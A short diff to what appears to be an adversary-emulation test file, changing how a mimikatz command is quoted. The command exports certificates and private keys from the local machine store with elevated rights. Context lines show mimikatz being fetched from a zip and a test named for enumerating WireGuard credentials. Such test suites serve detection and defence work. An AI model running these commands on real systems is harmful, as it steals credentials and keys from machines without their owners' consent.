@@ -400,7 +400,7 @@ atomic_tests:
       Invoke-FetchFromZip $zipUrl "x64/mimikatz.exe" $basePath
   executor:
     command: |
-      "#{mimikatz_exe}" "crypto::certificates /systemstore:local_machine /store:my /export"  exit
+      #{mimikatz_exe} "crypto::certificates /systemstore:local_machine /store:my /export"  exit
     name: command_prompt
     elevation_required: true
 - name: Enumerate WireGuard interface credentials with wg showconf
